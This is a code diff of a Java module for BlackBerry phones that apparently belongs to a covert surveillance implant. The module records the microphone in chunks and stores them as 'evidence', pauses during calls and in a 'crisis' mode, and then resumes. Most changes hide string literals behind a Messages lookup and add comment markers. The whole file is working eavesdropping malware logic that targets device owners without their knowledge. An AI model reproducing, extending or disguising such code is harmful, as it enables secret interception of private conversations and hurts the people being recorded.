@@ -12,6 +12,7 @@ package blackberry.module;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Messages;
 import blackberry.Status;
 import blackberry.config.ConfModule;
 import blackberry.debug.Check;
@@ -30,7 +31,7 @@ import blackberry.utils.Utils;
  */
 public final class ModuleMic extends BaseModule implements PhoneListener {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModMic", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModMic", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private static final long MIC_PERIOD = 5000;
@@ -53,7 +54,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
     int numFailures;
 
     public static String getStaticType() {
-        return "mic";
+        return Messages.getString("15.0"); //$NON-NLS-1$
     }
 
     public static ModuleMic getInstance() {
@@ -67,15 +68,9 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         return true;
     }
 
-    private void newState(int newstate) {
-        synchronized (stateLock) {
-            state = newstate;
-        }
-    }
-
     public void actualStart() {
         //#ifdef DEBUG
-        debug.info("start");
+        debug.info("start"); //$NON-NLS-1$
         //#endif
 
         synchronized (stateLock) {
@@ -83,12 +78,12 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
                 Phone.addPhoneListener(this);
 
                 //#ifdef DBC
-                Check.ensures(state != STARTED, "state == STARTED");
+                Check.ensures(state != STARTED, "state == STARTED"); //$NON-NLS-1$
                 //#endif			
                 startRecorder();
 
                 //#ifdef DEBUG
-                debug.trace("started");
+                debug.trace("started"); //$NON-NLS-1$
                 //#endif
 
             }
@@ -100,7 +95,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
 
     public void actualStop() {
         //#ifdef DEBUG
-        debug.info("stop");
+        debug.info("stop"); //$NON-NLS-1$
         //#endif
 
         synchronized (stateLock) {
@@ -108,7 +103,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
                 Phone.removePhoneListener(this);
 
                 //#ifdef DBC
-                Check.ensures(state != STOPPED, "state == STOPPED");
+                Check.ensures(state != STOPPED, "state == STOPPED"); //$NON-NLS-1$
                 //#endif
                 saveRecorderEvidence();
                 stopRecorder();
@@ -117,20 +112,26 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
 
         }
         //#ifdef DEBUG
-        debug.trace("stopped");
+        debug.trace("stopped"); //$NON-NLS-1$
         //#endif
 
+    }
+
+    private void newState(int newstate) {
+        synchronized (stateLock) {
+            state = newstate;
+        }
     }
 
     public void crisis(boolean value) {
         if (value) {
             //#ifdef DEBUG
-            debug.warn("Crisis!");
+            debug.warn("Crisis!"); //$NON-NLS-1$
             //#endif
             suspend();
         } else {
             //#ifdef DEBUG
-            debug.warn("End of Crisis!");
+            debug.warn("End of Crisis!"); //$NON-NLS-1$
             //#endif
             resume();
         }
@@ -138,7 +139,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
 
     synchronized void startRecorder() {
         //#ifdef DEBUG
-        debug.trace("startRecorder");
+        debug.trace("startRecorder"); //$NON-NLS-1$
         //#endif
 
         final DateTime dateTime = new DateTime();
@@ -148,7 +149,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         recorder.start();
 
         //#ifdef DEBUG
-        debug.trace("Started: " + (recorder != null));
+        debug.trace("Started: " + (recorder != null)); //$NON-NLS-1$
         //#endif
 
         if (Status.self().wantLight()) {
@@ -160,18 +161,18 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
 
     synchronized void stopRecorder() {
         //#ifdef DEBUG
-        debug.trace("stopRecorder");
+        debug.trace("stopRecorder"); //$NON-NLS-1$
         //#endif
 
         if (recorder == null) {
             //#ifdef DEBUG
-            debug.error("Null recorder");
+            debug.error("Null recorder"); //$NON-NLS-1$
             //#endif
             return;
         }
 
         //#ifdef DEBUG
-        debug.info("STOP");
+        debug.info("STOP"); //$NON-NLS-1$
         //#endif
 
         recorder.stop();
@@ -186,7 +187,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
      */
     public void actualLoop() {
         //#ifdef DBC
-        Check.requires(recorder != null, "actualRun: recorder == null");
+        Check.requires(recorder != null, "actualRun: recorder == null"); //$NON-NLS-1$
         //#endif
 
         synchronized (stateLock) {
@@ -196,7 +197,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
                     saveRecorderEvidence();
                 } else {
                     //#ifdef DEBUG
-                    debug.warn("numFailures: " + numFailures);
+                    debug.warn("numFailures: " + numFailures); //$NON-NLS-1$
                     //#endif
 
                     suspend();
@@ -204,13 +205,13 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
 
                 if (status.callInAction()) {
                     //#ifdef DEBUG
-                    debug.warn("phone call in progress, suspend!");
+                    debug.warn("phone call in progress, suspend!"); //$NON-NLS-1$
                     //#endif                   
                     suspend();
 
                 } else if (Status.getInstance().crisisMic()) {
                     //#ifdef DEBUG
-                    debug.warn("crisis, suspend!");
+                    debug.warn("crisis, suspend!"); //$NON-NLS-1$
                     //#endif                   
                     suspend();
                 }
@@ -220,7 +221,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
 
     private synchronized void saveRecorderEvidence() {
         //#ifdef DBC
-        Check.requires(recorder != null, "saveRecorderEvidence recorder==null");
+        Check.requires(recorder != null, "saveRecorderEvidence recorder==null"); //$NON-NLS-1$
         //#endif
 
         final byte[] chunk = recorder.getAvailable();
@@ -229,7 +230,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
 
             Evidence evidence = new Evidence(EvidenceType.MIC);
             //#ifdef DBC
-            Check.requires(evidence != null, "Null log");
+            Check.requires(evidence != null, "Null log"); //$NON-NLS-1$
             //#endif
 
             int offset = 0;
@@ -240,20 +241,20 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
 
             //#ifdef DEBUG
             if (offset != 0) {
-                debug.trace("offset: " + offset);
+                debug.trace("offset: " + offset); //$NON-NLS-1$
             } else {
             }
             //#endif
 
             evidence.createEvidence(getAdditionalData());
             //#ifdef DEBUG
-            debug.trace("saveRecorderEvidence, chunk size: " + chunk.length);
+            debug.trace("saveRecorderEvidence, chunk size: " + chunk.length); //$NON-NLS-1$
             //#endif
             evidence.writeEvidence(chunk, offset);
             evidence.close();
         } else {
             //#ifdef DEBUG
-            debug.warn("zero chunk ");
+            debug.warn("zero chunk "); //$NON-NLS-1$
             //#endif
             numFailures += 1;
         }
@@ -277,7 +278,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
 
         //#ifdef DBC
         Check.ensures(additionalData.length == tlen,
-                "Wrong additional data name");
+                "Wrong additional data name"); //$NON-NLS-1$
         //#endif
         return additionalData;
     }
@@ -289,13 +290,13 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         synchronized (stateLock) {
             if (state == STARTED) {
                 //#ifdef DEBUG
-                debug.info("Call: suspending recording");
+                debug.info("Call: suspending recording"); //$NON-NLS-1$
                 //#endif
                 stopRecorder();
                 state = SUSPENDED;
             } else {
                 //#ifdef DEBUG
-                debug.trace("suspend: already done");
+                debug.trace("suspend: already done"); //$NON-NLS-1$
                 //#endif
             }
         }
@@ -306,33 +307,23 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
             if (state == SUSPENDED && !Status.getInstance().callInAction()
                     && !Status.getInstance().crisisMic()) {
                 //#ifdef DEBUG
-                debug.info("Call: resuming recording");
+                debug.info("Call: resuming recording"); //$NON-NLS-1$
                 //#endif
                 startRecorder();
                 state = STARTED;
             } else {
                 //#ifdef DEBUG
-                debug.trace("resume: already done");
+                debug.trace("resume: already done"); //$NON-NLS-1$
                 //#endif
             }
         }
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParameters) {
-        setPeriod(MIC_PERIOD);
-        setDelay(MIC_PERIOD);
-        return true;
     }
 
     public void callIncoming(int callId) {
         init();
 
         //#ifdef DEBUG
-        debug.trace("callIncoming");
+        debug.trace("callIncoming"); //$NON-NLS-1$
         //#endif
 
         final ModuleMic agent = (ModuleMic) ModuleMic.getInstance();
@@ -343,7 +334,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         init();
 
         //#ifdef DEBUG
-        debug.trace("callInitiated");
+        debug.trace("callInitiated"); //$NON-NLS-1$
         //#endif
         final ModuleMic agent = (ModuleMic) ModuleMic.getInstance();
         agent.suspend();
@@ -353,7 +344,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         init();
 
         //#ifdef DEBUG
-        debug.trace("callDisconnected");
+        debug.trace("callDisconnected"); //$NON-NLS-1$
         //#endif
         final ModuleMic agent = (ModuleMic) ModuleMic.getInstance();
         agent.resume();
